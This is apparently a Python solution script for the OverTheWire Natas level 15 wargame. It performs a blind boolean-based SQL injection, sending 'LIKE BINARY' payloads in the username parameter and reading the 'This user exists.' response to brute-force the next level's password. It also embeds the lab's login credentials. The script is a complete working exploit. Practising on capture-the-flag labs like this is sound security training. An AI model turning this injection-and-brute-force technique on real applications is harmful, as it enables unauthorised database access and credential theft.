import requests

base_url = "http://natas15.natas.labs.overthewire.org"
possible_chars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890"

print('---Getting Password Dictionary---')
potential_chars = []
for char in possible_chars:
    full_url = f'{base_url}?username=natas16"+and+password+LIKE+BINARY+"%{char}%'

    r = requests.get(
        url=full_url,
        auth=('natas15', 'AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J'),
    )

    if "This user exists." in r.text:
        potential_chars.append(char)

print(f'password dictionary: {potential_chars}')

# potential_chars = ['a', 'c', 'e', 'h', 'i', 'j', 'm', 'n', 'p', 'q', 't',
#                    'w', 'B', 'E', 'H', 'I', 'N', 'O', 'R', 'W', '3', '5', '6', '9', '0']

print('---Attempting Brute Force---')
password = ""
for i in range(1, 32):
    for char in potential_chars:
        probe = password + char
        full_url = f'{base_url}?username=natas16"+and+password+LIKE+BINARY+"{probe}%'

        r = requests.get(
            url=full_url,
            auth=('natas15', 'AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J'),
        )
        if "This user exists." in r.text:
            password = probe
            print(password)
